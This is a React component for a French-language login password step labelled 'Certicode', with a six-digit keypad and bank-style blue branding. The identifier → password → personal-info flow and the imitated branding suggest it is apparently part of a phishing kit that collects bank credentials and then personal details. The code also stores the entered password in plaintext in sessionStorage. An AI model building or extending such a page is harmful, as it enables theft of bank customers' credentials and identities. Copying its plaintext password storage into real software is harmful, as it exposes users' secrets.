import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import NumericKeypad from '../components/NumericKeypad';

const PasswordStep = () => {
  const navigate = useNavigate();
  const [password, setPassword] = useState('');

  useEffect(() => {
    const identifier = sessionStorage.getItem('certicode_identifier');
    if (!identifier) {
      navigate('/login');
    }
  }, [navigate]);

  const handleNumberClick = (num) => {
    if (password.length < 6) {
      setPassword(password + num);
    }
  };

  const handleDelete = () => {
    setPassword(password.slice(0, -1));
  };

  const handleSubmit = () => {
    if (password.length === 6) {
      sessionStorage.setItem('certicode_password', password);
      navigate('/personal-info-step');
    }
  };

  return (
    <div className="min-h-screen bg-white py-8 px-4" data-testid="password-step">
      <div className="max-w-md mx-auto">
        <div className="mb-6">
          <h2 className="text-xl font-bold text-gray-900 mb-2">Mot de passe</h2>
          <p className="text-gray-600 text-sm">Mot de passe (6 chiffres)</p>
        </div>

        <NumericKeypad
          value={password}
          maxLength={6}
          onNumberClick={handleNumberClick}
          onDelete={handleDelete}
          onSubmit={handleSubmit}
          submitLabel="Se connecter"
          showAsDashes={true}
        />

        <div className="mt-8 text-center">
          <a href="#" className="text-[#003DA5] hover:underline text-sm font-medium" data-testid="forgot-password-link">
            Identifiant / Mot de passe oublié
          </a>
        </div>
      </div>
    </div>
  );
};

export default PasswordStep;
